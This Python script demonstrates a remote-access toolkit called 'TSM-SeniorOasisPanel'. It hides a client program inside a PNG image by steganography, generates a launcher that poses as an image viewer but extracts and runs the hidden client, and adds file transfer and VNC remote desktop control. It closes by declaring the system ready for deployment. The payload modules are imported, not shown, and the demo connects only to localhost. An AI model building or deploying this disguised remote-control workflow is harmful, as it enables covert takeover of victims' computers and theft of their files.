#!/usr/bin/env python3
"""
TSM-SeniorOasisPanel Demonstration Script
Shows complete workflow of the TSM system with steganography and hidden deployment.
"""

import os
import sys
import time
import subprocess
import threading
from PIL import Image, ImageDraw, ImageFont

def create_demo_image():
    """Create a demonstration image for steganography"""
    print("TSM-SeniorOasisPanel: Creating demonstration image...")
    
    # Create a professional-looking image
    img = Image.new('RGB', (1024, 768), color='lightblue')
    draw = ImageDraw.Draw(img)
    
    # Add title
    try:
        font_large = ImageFont.truetype("arial.ttf", 36)
        font_medium = ImageFont.truetype("arial.ttf", 24)
        font_small = ImageFont.truetype("arial.ttf", 18)
    except:
        font_large = ImageFont.load_default()
        font_medium = ImageFont.load_default()
        font_small = ImageFont.load_default()
    
    # Draw title
    draw.text((50, 50), "TSM-SeniorOasisPanel", fill='darkblue', font=font_large)
    draw.text((50, 100), "Advanced File Transfer System", fill='navy', font=font_medium)
    
    # Draw features
    features = [
        "• Secure file transfer over TCP",
        "• Multi-client support",
        "• Steganographic image embedding",
        "• Hidden client deployment",
        "• VNC remote desktop access",
        "• Cross-platform compatibility"
    ]
    
    y_pos = 150
    for feature in features:
        draw.text((50, y_pos), feature, fill='black', font=font_small)
        y_pos += 30
    
    # Draw decorative elements
    draw.rectangle([50, 400, 974, 500], outline='darkblue', width=2)
    draw.text((100, 430), "This image contains hidden TSM client executable", fill='darkblue', font=font_medium)
    draw.text((100, 460), "When viewed, it will establish a secure connection", fill='darkblue', font=font_small)
    
    # Save image
    demo_image_path = "TSM_Demo_Image.png"
    img.save(demo_image_path)
    print(f"TSM-SeniorOasisPanel: Demo image created: {demo_image_path}")
    return demo_image_path

def run_server_demo():
    """Run server demonstration"""
    print("\n" + "="*60)
    print("TSM-SeniorOasisPanel Server Demonstration")
    print("="*60)
    
    try:
        # Start server in background
        print("TSM-SeniorOasisPanel: Starting server...")
        server_process = subprocess.Popen([
            sys.executable, "TSM_SeniorOasisPanel_server.py"
        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        
        # Send server configuration
        server_process.stdin.write(b"localhost\n5000\n")
        server_process.stdin.flush()
        
        print("TSM-SeniorOasisPanel: Server started on localhost:5000")
        time.sleep(2)
        
        return server_process
        
    except Exception as e:
        print(f"TSM-SeniorOasisPanel: Server demo error: {e}")
        return None

def run_client_demo():
    """Run client demonstration"""
    print("\n" + "="*60)
    print("TSM-SeniorOasisPanel Client Demonstration")
    print("="*60)
    
    try:
        from TSM_SeniorOasisPanel_client import TSMSeniorOasisPanelClient
        
        # Create client
        client = TSMSeniorOasisPanelClient(host='localhost', port=5000)
        
        # Connect to server
        if client.connect():
            print("TSM-SeniorOasisPanel: Connected to server")
            
            # Create test file
            test_file = "demo_test_file.txt"
            with open(test_file, 'w') as f:
                f.write("TSM-SeniorOasisPanel Demo Test File\n")
                f.write("This file demonstrates the file transfer capabilities.\n")
                f.write(f"Created at: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            
            # Upload file
            print("TSM-SeniorOasisPanel: Uploading test file...")
            if client.upload_file(test_file):
                print("TSM-SeniorOasisPanel: File uploaded successfully")
            
            # Download file
            print("TSM-SeniorOasisPanel: Downloading test file...")
            if client.download_file("downloaded_demo_file.txt"):
                print("TSM-SeniorOasisPanel: File downloaded successfully")
            
            # Enable VNC
            print("TSM-SeniorOasisPanel: Enabling VNC screen sharing...")
            client.enable_vnc()
            
            # Disconnect
            client.disconnect()
            print("TSM-SeniorOasisPanel: Client demonstration completed")
            
            # Cleanup
            if os.path.exists(test_file):
                os.remove(test_file)
            
            return True
        else:
            print("TSM-SeniorOasisPanel: Failed to connect to server")
            return False
            
    except Exception as e:
        print(f"TSM-SeniorOasisPanel: Client demo error: {e}")
        return False

def run_steganography_demo():
    """Run steganography demonstration"""
    print("\n" + "="*60)
    print("TSM-SeniorOasisPanel Steganography Demonstration")
    print("="*60)
    
    try:
        from TSM_ImageSteganography import TSMImageSteganography
        
        # Create steganography object
        stego = TSMImageSteganography()
        
        # Create demo image
        demo_image = create_demo_image()
        
        # Embed client in image
        print("TSM-SeniorOasisPanel: Embedding client in image...")
        stego_image = "TSM_Stego_Demo.png"
        if stego.embed_client_in_image(demo_image, "TSM_SeniorOasisPanel_client.py", stego_image):
            print("TSM-SeniorOasisPanel: Client embedded successfully")
            
            # Verify steganographic image
            print("TSM-SeniorOasisPanel: Verifying steganographic image...")
            if stego.verify_stego_image(stego_image):
                print("TSM-SeniorOasisPanel: Image verification successful")
                
                # Extract client
                print("TSM-SeniorOasisPanel: Extracting client from image...")
                extracted_client = "extracted_demo_client.py"
                if stego.extract_client_from_image(stego_image, extracted_client):
                    print("TSM-SeniorOasisPanel: Client extracted successfully")
                    
                    # Verify extracted client
                    if os.path.exists(extracted_client):
                        with open(extracted_client, 'r') as f:
                            content = f.read()
                        if "TSMSeniorOasisPanelClient" in content:
                            print("TSM-SeniorOasisPanel: Extracted client verification successful")
                        else:
                            print("TSM-SeniorOasisPanel: Extracted client verification failed")
                    
                    # Cleanup
                    if os.path.exists(extracted_client):
                        os.remove(extracted_client)
                else:
                    print("TSM-SeniorOasisPanel: Client extraction failed")
            else:
                print("TSM-SeniorOasisPanel: Image verification failed")
        else:
            print("TSM-SeniorOasisPanel: Client embedding failed")
        
        # Cleanup
        if os.path.exists(demo_image):
            os.remove(demo_image)
        
        return True
        
    except Exception as e:
        print(f"TSM-SeniorOasisPanel: Steganography demo error: {e}")
        return False

def run_hidden_deployment_demo():
    """Run hidden deployment demonstration"""
    print("\n" + "="*60)
    print("TSM-SeniorOasisPanel Hidden Deployment Demonstration")
    print("="*60)
    
    try:
        from TSM_HiddenLauncher import TSMHiddenLauncher
        
        # Create hidden launcher
        launcher = TSMHiddenLauncher()
        
        # Create image viewer launcher
        stego_image = "TSM_Stego_Demo.png"
        if os.path.exists(stego_image):
            viewer_launcher = "TSM_ImageViewer_Demo.py"
            launcher.create_image_viewer_launcher(stego_image, viewer_launcher)
            
            if os.path.exists(viewer_launcher):
                print("TSM-SeniorOasisPanel: Image viewer launcher created")
                print(f"TSM-SeniorOasisPanel: Launcher file: {viewer_launcher}")
                print("TSM-SeniorOasisPanel: This launcher appears to be an image viewer")
                print("TSM-SeniorOasisPanel: When executed, it will extract and run the hidden client")
                
                # Cleanup
                if os.path.exists(viewer_launcher):
                    os.remove(viewer_launcher)
            else:
                print("TSM-SeniorOasisPanel: Image viewer launcher creation failed")
        else:
            print("TSM-SeniorOasisPanel: Steganographic image not found")
        
        return True
        
    except Exception as e:
        print(f"TSM-SeniorOasisPanel: Hidden deployment demo error: {e}")
        return False

def run_vnc_demo():
    """Run VNC demonstration"""
    print("\n" + "="*60)
    print("TSM-SeniorOasisPanel VNC Integration Demonstration")
    print("="*60)
    
    try:
        from TSM_VNCIntegration import TSMVNCIntegration, TSMVNCServer
        
        # Create VNC components
        vnc_server = TSMVNCServer(host='localhost', port=5001)
        vnc_client = TSMVNCIntegration(server_host='localhost', server_port=5001)
        
        print("TSM-SeniorOasisPanel: VNC components created successfully")
        print("TSM-SeniorOasisPanel: VNC server would run on localhost:5001")
        print("TSM-SeniorOasisPanel: VNC client would connect for screen sharing")
        print("TSM-SeniorOasisPanel: This enables remote desktop access capabilities")
        
        return True
        
    except Exception as e:
        print(f"TSM-SeniorOasisPanel: VNC demo error: {e}")
        return False

def main():
    """Main demonstration function"""
    print("TSM-SeniorOasisPanel Complete System Demonstration")
    print("=" * 60)
    print("This demonstration shows all capabilities of the TSM system:")
    print("1. File transfer server and client")
    print("2. Steganographic image embedding")
    print("3. Hidden client deployment")
    print("4. VNC remote desktop integration")
    print("=" * 60)
    
    # Run demonstrations
    demos = [
        ("Steganography", run_steganography_demo),
        ("Hidden Deployment", run_hidden_deployment_demo),
        ("VNC Integration", run_vnc_demo),
        ("Server", run_server_demo),
        ("Client", run_client_demo)
    ]
    
    server_process = None
    
    for demo_name, demo_func in demos:
        print(f"\nRunning {demo_name} demonstration...")
        try:
            if demo_name == "Server":
                server_process = demo_func()
            else:
                demo_func()
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: {demo_name} demo failed: {e}")
    
    # Cleanup
    if server_process:
        print("\nTSM-SeniorOasisPanel: Stopping server...")
        server_process.terminate()
        server_process.wait()
    
    # Cleanup demo files
    demo_files = [
        "TSM_Stego_Demo.png",
        "downloaded_demo_file.txt"
    ]
    
    for file in demo_files:
        try:
            if os.path.exists(file):
                os.remove(file)
        except:
            pass
    
    print("\n" + "="*60)
    print("TSM-SeniorOasisPanel Demonstration Complete")
    print("="*60)
    print("All system components have been demonstrated.")
    print("The TSM-SeniorOasisPanel system is ready for deployment.")
    print("\nFor detailed usage instructions, see TSM_DeploymentGuide.md")
    print("For testing, run: python TSM_SystemTest.py")

if __name__ == "__main__":
    main()
